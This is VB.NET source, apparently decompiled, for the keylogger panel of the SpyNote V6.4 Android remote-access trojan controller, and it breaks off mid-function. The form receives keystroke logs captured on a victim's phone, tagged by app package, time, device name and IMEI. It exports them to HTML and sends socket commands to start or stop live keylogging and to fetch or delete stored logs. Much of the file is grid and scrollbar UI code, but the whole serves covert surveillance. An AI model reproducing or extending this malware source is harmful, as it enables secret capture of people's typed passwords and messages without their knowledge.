Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.IO
Imports System.Text
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class key_logger
    Public TClient As SocketClient

    Public RowsToolTip As ToolTip_0

    Public RowsToolTip2 As ToolTip_0

    Private x As Integer

    Private y As Integer

    Private x1 As Integer

    Private y1 As Integer

    Public RowsToolTipShow As Boolean

    Public RowsToolTipShow1 As Boolean

    Private ofL As Boolean

    Private OnL As Boolean

    Private TRowCount As Integer

    Private aq1 As Integer
    Public Sub New()
        Me.RowsToolTip = New ToolTip_0()
        Me.RowsToolTip2 = New ToolTip_0()
        Me.TRowCount = 0
        Me.InitializeComponent()
    End Sub

    Private Sub ALOLO_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Resize
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub BOXDOWN_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles Me.Paint
        Dim rowCount As Integer
        Dim backColor As System.Drawing.Color
        If (Not Me.OnL) Then
            Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(30, 30, 30)
            Dim rectangle As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 0, Me.BOXDOWN.Width, Me.BOXDOWN.Height)
            ControlPaint.DrawBorder(e.Graphics, rectangle, color, 1, ButtonBorderStyle.None, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.None, color, 1, ButtonBorderStyle.None)
            Dim font As System.Drawing.Font = New System.Drawing.Font("Segoe UI Semibold", 8.25!, FontStyle.Regular)
            Dim solidBrush As System.Drawing.Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(255, 241, 241, 241))
            rowCount = Me.ViewManager.Rows.GetRowCount(DataGridViewElementStates.Selected)
            Dim str As String = String.Concat("Selected ", rowCount.ToString())
            backColor = Me.BOXDOWN.BackColor
            Dim r As Byte = backColor.R
            backColor = Me.BOXDOWN.BackColor
            Dim g As Byte = backColor.G
            backColor = Me.BOXDOWN.BackColor
            Dim brush As System.Drawing.Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(220, CInt(r), CInt(g), CInt(backColor.B)))
            Dim size As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Ln ", Me.aq1.ToString()), font)
            Dim size1 As System.Drawing.Size = TextRenderer.MeasureText(str, font)
            Dim rectangle1 As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 2, Me.BOXDOWN.Width, size1.Height)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle1)
            e.Graphics.DrawString(str, font, solidBrush, 0!, 2.0!)
            Dim num As Integer = CInt(Math.Round(CDbl(Me.BOXDOWN.Width) / 2))
            Dim width As Integer = Me.BOXDOWN.Width - size.Width
            rowCount = Me.ViewManager.Rows.Count
            Dim size2 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Count ", rowCount.ToString()), font)
            Dim rectangle2 As System.Drawing.Rectangle = New System.Drawing.Rectangle(num, 2, Me.BOXDOWN.Width, size2.Height)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle2)
            Dim graphics As System.Drawing.Graphics = e.Graphics
            rowCount = Me.ViewManager.Rows.Count
            graphics.DrawString(String.Concat("Count ", rowCount.ToString()), font, solidBrush, CSng(num), 2.0!)
            Dim rectangle3 As System.Drawing.Rectangle = New System.Drawing.Rectangle(width, 2, Me.BOXDOWN.Width, size.Height)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle3)
            e.Graphics.DrawString(String.Concat("Ln ", Me.aq1.ToString()), font, solidBrush, CSng(width), 2.0!)
        Else
            Dim color1 As System.Drawing.Color = System.Drawing.Color.FromArgb(30, 30, 30)
            Dim rectangle4 As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 0, Me.BOXDOWN.Width, Me.BOXDOWN.Height)
            ControlPaint.DrawBorder(e.Graphics, rectangle4, color1, 1, ButtonBorderStyle.None, color1, 1, ButtonBorderStyle.Solid, color1, 1, ButtonBorderStyle.None, color1, 1, ButtonBorderStyle.None)
            Dim font1 As System.Drawing.Font = New System.Drawing.Font("Segoe UI Semibold", 8.25!, FontStyle.Regular)
            Dim solidBrush1 As System.Drawing.Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(255, 241, 241, 241))
            rowCount = Me.DataGridView1.Rows.GetRowCount(DataGridViewElementStates.Selected)
            Dim str1 As String = String.Concat("Selected ", rowCount.ToString())
            backColor = Me.BOXDOWN.BackColor
            Dim r1 As Byte = backColor.R
            backColor = Me.BOXDOWN.BackColor
            Dim g1 As Byte = backColor.G
            backColor = Me.BOXDOWN.BackColor
            Dim brush1 As System.Drawing.Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(220, CInt(r1), CInt(g1), CInt(backColor.B)))
            Dim size3 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Ln ", Me.aq1.ToString()), font1)
            Dim size4 As System.Drawing.Size = TextRenderer.MeasureText(str1, font1)
            Dim rectangle5 As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 2, Me.BOXDOWN.Width, size4.Height)
            e.Graphics.FillRectangle((New Pen(brush1)).Brush, rectangle5)
            e.Graphics.DrawString(str1, font1, solidBrush1, 0!, 2.0!)
            Dim num1 As Integer = CInt(Math.Round(CDbl(Me.BOXDOWN.Width) / 2))
            Dim width1 As Integer = Me.BOXDOWN.Width - size3.Width
            rowCount = Me.DataGridView1.Rows.Count
            Dim size5 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Count ", rowCount.ToString()), font1)
            Dim rectangle6 As System.Drawing.Rectangle = New System.Drawing.Rectangle(num1, 2, Me.BOXDOWN.Width, size5.Height)
            e.Graphics.FillRectangle((New Pen(brush1)).Brush, rectangle6)
            Dim graphic As System.Drawing.Graphics = e.Graphics
            rowCount = Me.DataGridView1.Rows.Count
            graphic.DrawString(String.Concat("Count ", rowCount.ToString()), font1, solidBrush1, CSng(num1), 2.0!)
            Dim rectangle7 As System.Drawing.Rectangle = New System.Drawing.Rectangle(width1, 2, Me.BOXDOWN.Width, size3.Height)
            e.Graphics.FillRectangle((New Pen(brush1)).Brush, rectangle7)
            e.Graphics.DrawString(String.Concat("Ln ", Me.aq1.ToString()), font1, solidBrush1, CSng(width1), 2.0!)
        End If
    End Sub
    Private Sub DataGridView1_CellMouseClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseClick
        If (e.RowIndex <> -1) Then
            Me.VisualStudioVerticalScrollBar2.Llen = If(e.RowIndex >= Me.VisualStudioVerticalScrollBar2.Maximum, Me.VisualStudioVerticalScrollBar2.Maximum, e.RowIndex)
        End If
    End Sub

    Private Sub DataGridView1_CellMouseLeave(ByVal sender As Object, ByVal e As DataGridViewCellEventArgs) Handles DataGridView1.CellMouseLeave
        Me.RowsToolTip2._ToolTip.Hide(Me.ViewManager)
        Me.RowsToolTipShow1 = False
    End Sub

    Private Sub DataGridView1_CellMouseMove(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseMove
        If (e.RowIndex <> -1 And e.ColumnIndex <> -1) Then
            If (Me.DataGridView1.ShowCellToolTips) Then
                Me.DataGridView1.ShowCellToolTips = False
            End If
            Dim str As String = Me.DataGridView1.Rows(e.RowIndex).Cells(e.ColumnIndex).ToolTipText.Trim()
            If (Not Me.RowsToolTipShow1) Then
                If (str.Length <> 0) Then
                    Dim client As Point = MyBase.PointToClient(Control.MousePosition)
                    Me.RowsToolTip2._ToolTip.Show(Me.DataGridView1.Rows(e.RowIndex).Cells(e.ColumnIndex).ToolTipText, Me.DataGridView1, client)
                    Me.RowsToolTipShow1 = True
                End If
            End If
        End If
    End Sub

    Private Sub DataGridView1_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles DataGridView1.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar2 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar2
            visualStudioVerticalScrollBar2.Value = visualStudioVerticalScrollBar2.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar2
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub DataGridView1_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles DataGridView1.RowStateChanged
        If (e.StateChanged = DataGridViewElementStates.Selected) Then
            Me.VisualStudioVerticalScrollBar2.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar2.Maximum, Me.VisualStudioVerticalScrollBar2.Maximum, e.Row.Index)
        End If
    End Sub

    Private Sub DataGridView1_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles DataGridView1.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.y1 = e.NewValue
            Me.VisualStudioVerticalScrollBar2.Value = Me.y1
        Else
            Me.x1 = e.NewValue
            Me.VisualStudioHorizontalScrollBar2.Value = Me.x1
        End If
    End Sub

    Private Sub DataGridView1_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles DataGridView1.Sorted
        Me.VisualStudioVerticalScrollBar2.Llen = -1
    End Sub
    Public Function FormatImg(ByVal base64 As String) As System.Drawing.Bitmap
        Dim memoryStream As System.IO.MemoryStream = New System.IO.MemoryStream(Convert.FromBase64String(base64))
        Dim bitmap As System.Drawing.Bitmap = New System.Drawing.Bitmap(memoryStream)
        memoryStream.Close()
        memoryStream = Nothing
        Return bitmap
    End Function

    Private Sub GridViewoVerticalScrollBar0()
        Dim flag As Boolean = Me.PCNOTF.Visible > False
        If flag Then
            Dim flag2 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
            If flag2 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = False
            End If
            Dim flag3 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
            If flag3 Then
                Me.VisualStudioVerticalScrollBar1.Visible = False
            End If
        Else
            Dim columnsWidth As Integer = Me.ViewManager.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
            Dim flag4 As Boolean = columnsWidth >= Me.ViewManager.Width
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth - Me.ViewManager.Width
            Else
                Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth
            End If
            Dim flag5 As Boolean = columnsWidth > Me.ViewManager.Width
            If flag5 Then
                Dim flag6 As Boolean = Not Me.VisualStudioHorizontalScrollBar1.Visible
                If flag6 Then
                    Me.VisualStudioHorizontalScrollBar1.Visible = True
                End If
            Else
                Dim flag7 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
                If flag7 Then
                    Me.VisualStudioHorizontalScrollBar1.Visible = False
                End If
            End If
            Dim flag8 As Boolean = Me.ViewManager.Rows.Count > 0
            If flag8 Then
                Dim num As Integer = Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height
                Dim flag9 As Boolean = num > Me.ViewManager.Height
                If flag9 Then
                    Dim flag10 As Boolean = Not Me.VisualStudioVerticalScrollBar1.Visible
                    If flag10 Then
                        Me.VisualStudioVerticalScrollBar1.Visible = True
                    End If
                Else
                    Dim flag11 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                    If flag11 Then
                        Me.VisualStudioVerticalScrollBar1.Visible = False
                    End If
                End If
            Else
                Dim flag12 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                If flag12 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = False
                End If
            End If
        End If
    End Sub

    Private Sub GridViewoVerticalScrollBar1()
        Dim columnsWidth As Integer = Me.DataGridView1.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
        Dim flag As Boolean = columnsWidth >= Me.DataGridView1.Width
        If flag Then
            Me.VisualStudioHorizontalScrollBar2.Maximum = columnsWidth - Me.DataGridView1.Width
        Else
            Me.VisualStudioHorizontalScrollBar2.Maximum = columnsWidth
        End If
        Dim flag2 As Boolean = columnsWidth > Me.DataGridView1.Width
        If flag2 Then
            Dim flag3 As Boolean = Not Me.VisualStudioHorizontalScrollBar2.Visible
            If flag3 Then
                Me.VisualStudioHorizontalScrollBar2.Visible = True
            End If
        Else
            Dim flag4 As Boolean = Me.VisualStudioHorizontalScrollBar2.Visible > False
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar2.Visible = False
            End If
        End If
        Dim flag5 As Boolean = Me.DataGridView1.Rows.Count > 0
        If flag5 Then
            Dim num As Integer = Me.DataGridView1.Rows.Count * Me.DataGridView1.Rows(0).Height
            Dim flag6 As Boolean = num > Me.DataGridView1.Height
            If flag6 Then
                Dim flag7 As Boolean = Not Me.VisualStudioVerticalScrollBar2.Visible
                If flag7 Then
                    Me.VisualStudioVerticalScrollBar2.Visible = True
                End If
            Else
                Dim flag8 As Boolean = Me.VisualStudioVerticalScrollBar2.Visible > False
                If flag8 Then
                    Me.VisualStudioVerticalScrollBar2.Visible = False
                End If
            End If
        Else
            Dim flag9 As Boolean = Me.VisualStudioVerticalScrollBar2.Visible > False
            If flag9 Then
                Me.VisualStudioVerticalScrollBar2.Visible = False
            End If
        End If
    End Sub

    Public Function IMG(ByVal v As String, ByVal xx As Integer, ByVal yy As Integer) As System.Drawing.Bitmap
        Dim str As String = My.Resources.ANUN.ToString()
        If (Operators.CompareString(v, "-1", False) <> 0 Or Operators.CompareString(v, "", False) = 0) Then
            Dim memoryStream As System.IO.MemoryStream = New System.IO.MemoryStream(Convert.FromBase64String(v))
            Dim bitmap As System.Drawing.Bitmap = New System.Drawing.Bitmap(Image.FromStream(memoryStream))
            If (bitmap.Size.Width = xx And bitmap.Size.Height = yy) Then
                str = v
            End If
            memoryStream.Dispose()
        End If
        Return Me.FormatImg(str)
    End Function
    Private Sub key_logger_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.Closing
        If (Not Me.ThemeButton4.Enabled) Then
            Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(54)), Data.SplitData))
        End If
    End Sub

    Private Sub key_logger_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\2.ico"))
        Me.ViewManager.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
        Me.DataGridView1.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
        Me.PCNOTF.Image = Store.Bitmap_0("NFD\nf")
        Me.SELCT_LOG.Renderer = New ThemeToolStripCmbx()
        Me.TScrolls.Interval = Store.TScrollsInterval
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.TProgressBar.Enabled = True
        Me.TScrolls.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub

    Private Sub LBER_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LBER.Click
        Me.PNLERRORS.Visible = False
    End Sub

    Private Sub NF()
        If (Operators.CompareString(Me.SLLOG.TxText, "n/a", False) = 0) Then
            If (Me.ViewManager.Rows.Count <= 0) Then
                If (Me.PCNOTF.Dock = DockStyle.None) Then
                    Me.PCNOTF.Dock = DockStyle.Fill
                End If
                If (Not Me.PCNOTF.Visible) Then
                    Me.PCNOTF.Visible = True
                End If
            Else
                If (Me.PCNOTF.Dock = DockStyle.Fill) Then
                    Me.PCNOTF.Dock = DockStyle.None
                End If
                If (Me.PCNOTF.Visible) Then
                    Me.PCNOTF.Visible = False
                End If
            End If
        End If
    End Sub

    Private Sub RefScrolls()
        Dim num As Integer = 0
        If (MyBase.Visible) Then
            SyncLock Me.ViewManager
                If (Me.ViewManager.Rows.Count > 0) Then
                    If (Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height > Me.ViewManager.Height) Then
                        num = CInt(Math.Round(CDbl(Me.ViewManager.Height) / CDbl(Me.ViewManager.Rows(0).Height))) - 2
                        If (num < 0) Then
                            num = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar1.Maximum = Me.ViewManager.Rows.Count - num
                Me.GridViewoVerticalScrollBar0()
            End SyncLock
        End If
    End Sub

    Private Sub RefScrolls2()
        Dim num As Integer = 0
        If (MyBase.Visible) Then
            SyncLock Me.DataGridView1
                If (Me.DataGridView1.Rows.Count > 0) Then
                    If (Me.DataGridView1.Rows.Count * Me.DataGridView1.Rows(0).Height > Me.DataGridView1.Height) Then
                        num = CInt(Math.Round(CDbl(Me.DataGridView1.Height) / CDbl(Me.DataGridView1.Rows(0).Height))) - 2
                        If (num < 0) Then
                            num = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar2.Maximum = Me.DataGridView1.Rows.Count - num
                Me.GridViewoVerticalScrollBar1()
                If (Me.TRowCount = -1) Then
                    Me.ToEndDataGridView1()
                    Me.TRowCount = 0
                End If
            End SyncLock
        End If
    End Sub

    Private Sub SELCT_LOG_Closing(ByVal sender As Object, ByVal e As ToolStripDropDownClosingEventArgs) Handles SELCT_LOG.Closing
        Me.SLLOG.BordColor = Color.FromArgb(67, 67, 70)
        Me.SLLOG.MyArrwColorNone = Color.FromArgb(153, 153, 153)
        Me.SLLOG.MylinColorNone = Color.FromArgb(67, 67, 70)
        Me.SLLOG.Refresh()
    End Sub

    Private Sub SELCT_LOG_Opening(ByVal sender As Object, ByVal e As CancelEventArgs) Handles SELCT_LOG.Opening
        Me.SLLOG.BordColor = Color.FromArgb(40, 98, 150)
        Me.SLLOG.MyArrwColorNone = Color.FromArgb(40, 98, 150)
        Me.SLLOG.MylinColorNone = Color.FromArgb(40, 98, 150)
        Me.SLLOG.Refresh()
    End Sub

    Private Sub SLLOG_Click(ByVal sender As Object, ByVal e As EventArgs) Handles SLLOG.Click
        If (Me.SELCT_LOG.Items.Count > 0) Then
            Me.SELCT_LOG.Width = Me.SLLOG.Width + 30
            Me.SELCT_LOG.Height = Me.SELCT_LOG.PreferredSize.Height
            Dim screen As System.Drawing.Point = Me.SLLOG.PointToScreen(New System.Drawing.Point(0, 0))
            Dim point As System.Drawing.Point = New System.Drawing.Point(screen.X, screen.Y + Me.SLLOG.Height)
            Me.SELCT_LOG.Show(point)
        End If
    End Sub

    Private Sub SLOGS(ByVal sender As Object, ByVal e As EventArgs)
        Try
            Dim tag As String = CStr(TryCast(sender, ToolStripMenuItem).Tag)
            If (Operators.CompareString(tag, Nothing, False) <> 0) Then
                Me.SLLOG.Tag = tag
                Me.SLLOG.TxText = tag
                Me.SLLOG.Refresh()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TabPage1_Enter(ByVal sender As Object, ByVal e As EventArgs) Handles TabPage1.Enter
        Me.SplitContainer1.Panel2.Visible = False
        Me.SplitContainer1.Panel1.Visible = True
        Me.ofL = True
        Me.OnL = False
    End Sub

    Private Sub TabPage2_Enter(ByVal sender As Object, ByVal e As EventArgs) Handles TabPage2.Enter
        Me.SplitContainer1.Panel2.Visible = True
        Me.SplitContainer1.Panel1.Visible = False
        Me.ofL = False
        Me.OnL = True
    End Sub

    Public Sub TData(ByVal Ay As Array)
        Try
            Dim value As String = CStr(Ay.GetValue(0))
            If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(83)), False) = 0) Then
                Me.LBER.Text = CStr(Ay.GetValue(1))
                Me.PNLERRORS.Visible = True
                Me.PNLERRORS.Refresh()
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(114)), False) = 0) Then
                If (Me.SELCT_LOG.Items.Count > 0) Then
                    Me.SELCT_LOG.Items.Clear()
                End If
                Dim strArrays As String() = CStr(Ay.GetValue(1)).Split(New String() {Data.SplitPaths}, StringSplitOptions.RemoveEmptyEntries)
                Dim length As Integer = CInt(strArrays.Length) - 1
                Dim num As Integer = 0
                Do
                    If (strArrays(num).ToString().ToUpper().EndsWith(".LOG")) Then
                        Dim toolStripMenuItem As System.Windows.Forms.ToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem() With
                        {
                            .Text = strArrays(num),
                            .Name = String.Concat("m_item", Conversions.ToString(Me.SELCT_LOG.Items.Count)),
                            .Tag = strArrays(num),
                            .ImageScaling = ToolStripItemImageScaling.None
                        }
                        Dim toolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem = toolStripMenuItem
                        AddHandler toolStripMenuItem1.Click, New EventHandler(AddressOf Me.SLOGS)
                        Me.SELCT_LOG.Items.Add(toolStripMenuItem1)
                        If (Not Me.SLLOG.Enabled) Then
                            Me.SLLOG.Enabled = True
                        End If
                    End If
                    num = num + 1
                Loop While num <= length
                Me.SLLOG.TxText = Me.SELCT_LOG.Items(Me.SELCT_LOG.Items.Count - 1).Text
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) = 0) Then
                Me.ViewManager.Rows.Clear()
                Dim stringBuilder As System.Text.StringBuilder = New System.Text.StringBuilder()
                stringBuilder.Append(String.Concat("<title>Spy Note - ", MyBase.Name, "</title>"))
                Dim stringBuilder1 As System.Text.StringBuilder = New System.Text.StringBuilder()
                stringBuilder1.Append(String.Concat("</tr><th>package</th><th>", Me.ViewManager.Columns(1).HeaderText, "</th><th>time</th><tr>"))
                Dim stringBuilder2 As System.Text.StringBuilder = New System.Text.StringBuilder()
                Dim strArrays1 As String() = CStr(Ay.GetValue(1)).Split(New String() {Data.SplitLines}, StringSplitOptions.RemoveEmptyEntries)
                Dim length1 As Integer = CInt(strArrays1.Length) - 1
                Dim num1 As Integer = 0
                Do
                    Dim strArrays2 As String() = strArrays1(num1).Split(New String() {Data.SplitArray}, StringSplitOptions.RemoveEmptyEntries)
                    Me.ViewManager.Rows.Add(New Object() {Me.IMG(strArrays2(0), 24, 24), strArrays2(1)})
                    Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(0).ToolTipText = String.Concat("Package: ", strArrays2(2), "" & vbCrLf & "Time: ", strArrays2(3))
                    stringBuilder2.Append(String.Concat(New String() {"</tr> <td>", strArrays2(2), "</td><td>", strArrays2(1), "</td><td>", strArrays2(3), "</td><tr>" & vbCrLf & ""}))
                    num1 = num1 + 1
                Loop While num1 <= length1
                If (stringBuilder2.Length > 0) Then
                    Store.StartThread(DirectCast((New Object() {stringBuilder, stringBuilder1, stringBuilder2, String.Concat(Me.TClient.ClientName, "_", Me.TClient.ClientImei), "keylogger"}), Array))
                End If
            ElseIf (Operators.CompareString(value, Store.BFF(Store.buff, CLng(115)), False) = 0) Then
                Dim strArrays3 As String() = CStr(Ay.GetValue(1)).Split(New String() {Data.SplitArray}, StringSplitOptions.RemoveEmptyEntries)
                Me.DataGridView1.Rows.Add(New Object() {Me.IMG(strArrays3(0), 24, 24), strArrays3(1)})
                Me.DataGridView1.Rows(Me.DataGridView1.Rows.Count - 1).Cells(0).ToolTipText = String.Concat("Package: ", strArrays3(2), "" & vbCrLf & "Time: ", strArrays3(3))
                Dim maximum As Integer = Me.VisualStudioVerticalScrollBar2.Maximum
                Dim value1 As Integer = Me.VisualStudioVerticalScrollBar2.Value
                If (Not (value1 + 1 = maximum Or value1 = maximum)) Then
                    Me.TRowCount = 0
                Else
                    Me.TRowCount = -1
                End If
            End If
        Catch exception As System.Exception
        End Try
        Try
            Me.NF()
        Catch exception1 As System.Exception
        End Try
    End Sub

    Private Sub ThemeButton1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton1.Click
        If (Operators.CompareString(Me.SLLOG.TxText, "n/a", False) <> 0) Then
            Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(51)), Data.SplitData, Me.SLLOG.TxText))
        End If
    End Sub

    Private Sub ThemeButton2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton2.Click
        If (Operators.CompareString(Me.SLLOG.TxText, "n/a", False) <> 0) Then
            If (Me.SELCT_LOG.Items.Count > 0) Then
                Dim count As Integer = Me.SELCT_LOG.Items.Count - 1
                Dim num As Integer = 0
                While num <= count
                    If (Operators.CompareString(Me.SELCT_LOG.Items(num).Text, Me.SLLOG.TxText, False) <> 0) Then
                        num = num + 1
                    Else
                        Me.SELCT_LOG.Items.RemoveAt(num)
                        Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(52)), Data.SplitData, Me.SLLOG.TxText))
                        If (Me.SELCT_LOG.Items.Count <> 0) Then
                            Me.SLLOG.TxText = Me.SELCT_LOG.Items(Me.SELCT_LOG.Items.Count - 1).Text
                        Else
                            Me.SLLOG.TxText = "n/a"
                        End If
                        Exit While
                    End If
                End While
            End If
        End If
    End Sub

    Private Sub ThemeButton3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton3.Click
        If (Not Me.ThemeButton4.Enabled) Then
            Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(54)), Data.SplitData))
            Me.ThemeButton4.Enabled = True
            Me.ThemeButton3.Enabled = False
        End If
    End Sub

    Private Sub ThemeButton4_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton4.Click
        If (Not Me.ThemeButton3.Enabled) Then
            Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(53)), Data.SplitData))
            Me.ThemeButton4.Enabled = False
            Me.ThemeButton3.Enabled = True
        End If
    End Sub

    Private Sub ToEndDataGridView1()
        Try
            If (Me.DataGridView1.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.DataGridView1.RowCount - 1
                Me.DataGridView1.CurrentCell = Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Cells(0)
                Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Selected = True
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (Me.Text <> MyBase.Tag) Then
                Me.Text = Conversions.ToString(MyBase.Tag)
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar(Store.BFF(Store.buff, CLng(50)), "null")
        Else
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TScrolls_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TScrolls.Tick
        Me.RefScrolls()
        Me.RefScrolls2()
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_CellMouseClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles ViewManager.CellMouseClick
        If (e.RowIndex <> -1) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.RowIndex >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.RowIndex)
        End If
    End Sub

    Private Sub ViewManager_CellMouseLeave(ByVal sender As Object, ByVal e As DataGridViewCellEventArgs) Handles ViewManager.CellMouseLeave
        Me.RowsToolTip._ToolTip.Hide(Me.ViewManager)
        Me.RowsToolTipShow = False
    End Sub

    Private Sub ViewManager_CellMouseMove(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles ViewManager.CellMouseMove
        If (e.RowIndex <> -1 And e.ColumnIndex <> -1) Then
            If (Me.ViewManager.ShowCellToolTips) Then
                Me.ViewManager.ShowCellToolTips = False
            End If
            Dim str As String = Me.ViewManager.Rows(e.RowIndex).Cells(e.ColumnIndex).ToolTipText.Trim()
            If (Not Me.RowsToolTipShow) Then
                If (str.Length <> 0) Then
                    Dim client As Point = MyBase.PointToClient(Control.MousePosition)
                    Me.RowsToolTip._ToolTip.Show(Me.ViewManager.Rows(e.RowIndex).Cells(e.ColumnIndex).ToolTipText, Me.ViewManager, client)
                    Me.RowsToolTipShow = True
                End If
            End If
        End If
    End Sub

    Private Sub ViewManager_MouseClick(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseClick
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar1 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            visualStudioVerticalScrollBar1.Value = visualStudioVerticalScrollBar1.Value + 1
        Else
